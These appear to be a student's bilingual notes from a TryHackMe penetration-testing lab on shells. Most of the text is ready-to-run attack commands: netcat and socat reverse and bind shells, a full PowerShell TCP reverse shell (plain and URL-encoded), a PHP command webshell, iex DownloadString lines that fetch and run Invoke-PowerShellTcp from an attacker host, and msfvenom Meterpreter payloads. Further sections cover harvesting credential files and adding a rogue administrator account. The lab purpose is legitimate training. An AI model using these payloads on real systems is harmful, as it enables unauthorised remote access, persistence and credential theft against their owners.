# Shell
## What is a shell?
	--> shell 是我們與命令列環境 (CLI) 互動時所使用的工具
	--> linux  : bash 或 sh 
	--> window : cmd.exe 和 Powershell
	--> 強制遠端伺服器向我們發送對伺服器的命令列存取（反向shell）

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	Type : 
		--> Reverse shells : 指目標被迫執行連接回您的電腦的程式碼
			--> 繞過防火牆規則的好方法
			
			--> 在攻擊機上： sudo nc -lvnp 443 //偵聽
			--> 關於目標    ： nc <LOCAL-IP> <PORT> -e /bin/bash

			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> Bind shells : 指在目標上執行的程式碼用於啟動附加到直接在目標上的 shell 的偵聽器
			--> 在攻擊機上：nc MACHINE_IP <port>
			--> 關於目標    ：nc -lvnp <port> -e "cmd.exe" //偵聽
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> 互動式 :  Powershell、Bash、Zsh、sh 或任何其他標準CLI環境
		--> 非互動式shell  : sudo rlwrap nc -lvnp 443 <-- 將惡意 shell 程式碼注入網站
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	shell 儲存庫 :
		--> Payloads all the Things : 
			--> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
		--> PentestMonkey cheat-sheet : 
			--> https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
		--> Kali Linux : 
			--> /usr/share/webshells
		--> SecLists 單字列表 :
			-->  https://github.com/danielmiessler/SecLists

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Tools : 
		--> Netcat -- "Swiss Army Knife"
			--> 接收反向shell 並連接到附加到目標系統上的綁定shell 的遠端連接埠	
			
			--> Reverse Shells :
				--> 啟動 netcat 偵聽器 : nc -lvnp <port-number>
				--> 使用低於 1024 的端口，則需要sudo
				
			--> Bind Shells : 
				--> nc <target-ip> <chosen-port>
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> Netcat Shell Stabilisation
			--> Python :
				--> sudo nc -lvnp 443
				--> python3 -c 'import pty;pty.spawn("/bin/bash")'
				--> export TERM=xterm-  <-- clear
				--> Ctrl + Z  =>$ ^Z
				--> stty raw -echo; fg : 重新進入 shell
				
				--> reset :  shell 死機
				
			--> rlwrap :
				--> 在處理 Windows shell 時特別有用
				--> sudo apt install rlwrap
				--> rlwrap nc -lvnp <port>
				--> Ctrl + Z
				--> stty raw -echo; fg :重新進入 shell
				
			-->Socat
				--> 僅限於 Linux 目標
				--> 傳輸到目標機器 : socat 靜態編譯的二進位檔案
				--> https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true
				
				--> sudo python3 -m http.server 80 :  setting up a Python3 webserver on port 80
				--> under shell :  wget <LOCAL-IP>/socat -O /tmp/socat
				
				--> Powershell : Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
					-->  using either Invoke-WebRequest or a webrequest system class
					
				--> stty -a
					--> stty rows <number>
					--> stty cols <number>
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> Socat
			--> 比開箱即用的 netcat shell 更穩定
			--> 將其視為兩點之間的連接器
			
			--> Reverse Shells :
				--> kali : socat TCP-L:<port> -  : 基本反向 shell 偵聽器的語法
					--> socat TCP-L:8080 : 讓 socat 監聽 TCP 連接埠 8080
					
				--> Windows  目標: socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
					--> 「pipes」選項用於強制powershell（或cmd.exe）使用Unix風格的標準輸入和輸出。
				--> Linux    目標 : socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
				 
				--> example : 

			--> Bind Shells :
				--> Linux目標 
					--> socat TCP-L:<PORT> EXEC:"bash -li"
					
				--> Windows 目標
					--> socat TCP-L:<PORT> EXEC:powershell.exe,pipes
					
				--> kali :
					--> socat TCP:<TARGET-IP>:<TARGET-PORT> -

			--> socat TCP-L:<port> FILE:`tty`,raw,echo=0

			--> 上傳預先編譯的 socat 二進位文件 :
				-->  https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true
			
			--> socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
				--> pty，在目標上分配一個偽終端
				--> stderr，確保任何錯誤訊息都顯示在 shell 中（通常是非互動式 shell 的問題）
				--> sigint，將任何 Ctrl + C 指令傳遞到子進程中，允許我們終止 shell 內的指令
				--> setid，在新會話中建立進程
				--> sane，穩定終端，嘗試「正常化」它
				
				--> let the 非互動式 shell  be 完全互動的 bash shell
					e.g > sudo rlwrap nc -lvnp 443
					    > socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
					    
					    then 
					    > sudo socat TCP-L:<port> FILE:`tty`,raw,echo=0
					    > can use ssh now
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    
		--> Socat Encrypted Shells	
			--> 能夠繞過IDS
			--> TCP => OPENSSL
			--> 產生一個憑證才能使用加密的 shell
				--> openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
				--> 2048 位元 RSA 金鑰以及匹配的憑證文件，自簽名，有效期不到一年
			--> cat shell.key shell.crt > shell.pem
			
			--> Reverse Shells :
				--> kali : socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
					--> verify=0 告訴連接不必費心去驗證我們的證書是否已由公認的權威機構正確簽署
				--> target : socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

			--> Bind Shells :
				--> 憑證也必須與偵聽器一起使用，因此需要複製 PEM 檔案
				--> target : socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
				--> kali : socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 
			
			--> task : 
				--> tty 技術設定 OPENSSL-LISTENER 的語法是什麼？使用連接埠 53 和名為“encrypt.pem”的 PEM 文件	
					--> socat OPENSSL-LISTENER:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0  
					
				--> 使用什麼語法來連接回此偵聽器
					--> socat OPENSSL:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
					
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> Common Shell Payloads
			--> Windows 版本:  nc.exe
				--> /usr/share/windows-resources/binaries
				--> netcat-traditional -e : 讓您在連線時執行進程。例如，作為聽眾
					--> nc -lvnp <PORT> -e /bin/bash 綁定 shell
				--> nc <LOCAL-IP> <PORT> -e /bin/bash將導致目標上出現反向 shell
			
			--> linux :
				--> 綁定 shell 建立偵聽器	
					--> mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
				
				--> 發送 netcat 反向 shel
					--> mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
					
			--> Windows :
				--> Powershell 反向 shell 
					--> 複製到 cmd.exe shell : powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
				--> kali : sudo nc -lvnp <port>
				
			--> Reverse Shell Cheat Sheet :
				--> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> Msfvenom : 用於動態產生有效負載
			--> type : .exe .aspx .war .py
			--> msfvenom -p <PAYLOAD> <OPTIONS>
			
			-->  Windows x64 反向 Shell .exe
				--> msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
				--> -f <輸出格式> | -o <輸出位置和檔案名稱> | LHOST= <IP> | LPORT= <連接埠>
			
			--> Linux x64 反向 Shell .elf
	 			--> msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443 
	 			
			--> 分階段 Staged 
				--> stager 直接在伺服器本身上執行的一段程式碼。它連接回等待偵聽器 並不包含任何反向 shell 程式碼
				--> 特殊的偵聽器－通常是Metasploit multi/handler
				
			--> 無階段Stageless : 更容易被防毒或入侵偵測程式發現和刪除
			
			--> Meterpreter shell : 在處理 Windows 目標時非常有用
			
			--> 命名系統 Payload Naming Conventions : 
				--> <OS>/<arch>/<payload> 
					--> e.g linux/x86/shell_reverse_tcp -- x86 Linux目標產生無階段反向 shell 。
					--> e.g windows/shell_reverse_tcp --Windows 32 位元目標
				--> 為正常 (x64)
				
				--> Stageless payloads 	: 以底線 (_) 表示 	-- linux/x86/meterpreter_reverse_tcp
				--> Staged payloads  	: 以正斜線 (? ) 表示 	-- windows/x64/meterpreter/reverse_tcp
			
			--> 除了msfconsole手冊頁之外	
				--> msfvenom --list payloads | grep "" 以搜尋特定的一組有效負載
				
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> Metasploit  
			--> msfconsole
			--> use exploit/multi/handler : 用於接收反向shell
			--> show options
			--> set payload、LHOST 和 LPORT
			--> exploit -j 啟動該模組，作為後台作業運行
			--> sessions 1再次將其置於前台運行
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> WebShells
			--> 上傳可執行檔的網站
			--> https://tryhackme.com/r/room/uploadvulns
			
			--> <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
				--> url?cmd=command 
			
			--> Linux  : 	
				--> /usr/share/webshells
				--> PentestMonkey php-reverse-shell
				--> https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
			
			--> Windows : URL 編碼的 Powershell 反向 Shell
				--> powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D
				
				--> ?cmd=powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://10.11.92.230:9999/2024_5_CTF/try_hack_me/Jr_Penetration_Tester/task/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 10.11.92.230 -Port 2345"
			
		--> Invoke-PowerShellTcp  :
			--> https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
			
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Next step : 尋找機會存取使用者帳戶
		--> Linux 
			--> SSH key : /home/<user>/.ssh
			
			--> CVE-2016-5195 : https://dirtycow.ninja/
			--> /etc/shadow
			--> /etc/passwd
			
		--> Windows
			--> VNC 伺服器 : 以明文形式儲存在註冊表中
			--> FileZilla FTP 伺服器 : XML檔案中 -- MD5 Hash 或純文字形式
				--> C:\Program Files\FileZilla Server\FileZilla Server.xml
				--> C:\xampp\FileZilla Server\FileZilla Server.xml
			
			--> 以 SYSTEM 使用者身分執行的 shell 
				--> 將您自己的帳戶（在管理員群組中）新增至計算機
				--> 透過RDP、 telnet 、 winexe 、 psexec 、 WinRM 或任意數量的其他方法登錄
				--> net user <username> <password> /add
				--> net localgroup administrators <username> /add
## linux Ubuntu 18.04 server  : 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> task 1: 
		--> 將 Webshel​​l 上傳到 Linux 機器
			--> uploads (webshell.php) to server 
		--> 將反向 shell 傳送 : 
			--> url?cmd=nc 10.11.92.230 7777 -e /bin/bash
			--> kali : nc -lvnp 7777
				
			--> 穩定netcat : 
				--> python3 -c 'import pty;pty.spawn("/bin/bash")'
				--> export TERM=xterm
				--> out : Ctrl + Z
				--> go : stty raw -echo; fg
				
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> task 2:
		--> sudo nano /usr/share/webshells/php/php-reverse-shell.php
			--> 更改 IP 和端口
			--> tun0 IP
		--> sudo cp /usr/share/webshells/php/php-reverse-shell.php php-reverse-shell.php
		
		--> kali : nc -lvnp 8888
		--> after nc => uploads it
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> task 3:
		--> login : ssh shell@10.10.198.111 | TryH4ckM3!
			--> nc 10.11.92.230 7777 -e /bin/bash
			--> nc -lvnp 7777
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> task 4: 
		--> 使用 Socat  : Reverse Shell
		-->ssh  :  socat TCP:10.11.92.230:7777 EXEC:"bash -li"
		-->kali :  socat TCP-L:7777 - 
			
		--> type command on kali will run on ssh *
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> task 5:
		--> 反向 shell 技術 :
			--->  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

## Windows 2019 Server  :
	--> Username: Administrator | Password: TryH4ckM3!
	--> login using RDP : 
		--> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:xx.xx.xx.xx /u:Administrator /p:'TryH4ckM3!'
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> PS C:\Users\Administrator>	// in RDP's Administrator cmd 
		
		--> 1. python3 -m http.server 9999
		--> 2. nc -lnvp 1234
		--> 3. powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://10.11.92.230:9999/2024_5_CTF/try_hack_me/Jr_Penetration_Tester/task/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 10.11.92.230 -Port 1234"

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> task 6:
		--> 上傳並激活php-reverse-shell 
			--> fail !!! Can't !!!
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> task 7:
		--> 上傳 Webshel​​l 並嘗試使用 Powershell 取得反向 shell
			=>PS C:\xampp\htdocs\uploads>
			
		--> http://10.10.42.131/uploads/webshell.php?cmd=ipconfig
		--> nc -lvnp 2345
		--> python3 -m http.server 9999
			
		--> ?cmd=powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://10.11.92.230:9999/2024_5_CTF/try_hack_me/Jr_Penetration_Tester/task/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 10.11.92.230 -Port 2345"
			
		--> Invoke-PowerShellTcp  :
			-->  https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
		10.10.38.232 443 -e
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> task 8:
		--> 建立一個新使用者並將其新增至「管理員」群組
			--> net user CJTest TryH4ckM3! /add
			--> net localgroup administrators CJTest /add
		--> RDP 登入
			--> Kali : xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.42.131 /u:CJTest /p:'TryH4ckM3!'
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> task 9: 試使用 socat 和 netcat 在 Windows 目標上取得反向和綁定 shell
		=> C:\Users\Administrator>
			
		--> Netcat 反向 Shell — Windows
			--> kali : rlwrap nc -lvnp 443
			--> Rdp  : 
				--> cmd : nc 10.11.92.230 443 -e "cmd.exe"
					=> C:\Users\Administrator>
				--> PS  : nc 10.11.92.230 443 -e "powershell.exe"
					=> PS C:\Users\Administrator>
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		--> Netcat 綁定 Shell — Windows
			--> Rdp  : 
				--> cmd :  nc -lvnp 1024 -e "cmd.exe"
			--> kali : 
				--> nc -nv 10.10.223.187 1024
				
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~				
		--> Socat 反向 Shell — Windows
			--> kali : 
				--> socat TCP-L:443 - 
			--> Rdp  : 
				--> cmd : socat TCP:10.11.92.230:443 EXEC:cmd.exe,pipes
				
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~			
		--> Socat 綁定 Shell — Windows
			--> Rdp  : 
				--> cmd : socat TCP-L:8080 EXEC:cmd.exe,pipes
			--> kali : 
				--> socat TCP:10.10.223.187:8080 -

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> task 10:
		=> get Meterpreter shell : 
			--> msfvenom 建立 64 位元 Windows Meterpreter shell 並將其上傳到 Windows Target
			
		=> get a shell.exe : 	uploadfile_shell_meterpreter.exe
				--> msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.11.92.230 LPORT=443
	
		--> 啟動 shell 並使用 multi/handler 捕獲它
			--> msfconsole
				--> use multi/handler
				--> set PAYLOAD windows/x64/meterpreter/reverse_tcp
				--> set LHOST 10.11.92.230
				--> set LPORT 443
				--> run 
				
		--> unload File (shell.exe)
			--> download it on targat computer : rdp 
				--> then run the file 
			--> after run => 
				meterpreter >
			
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> task 11:	
		--> 為任一目標建立分階段和無階段的 meterpreter shell。上傳並手動啟動它們
			-->  meterpreter shell 只能用 Metasploit 或 msfconsole 捕獲
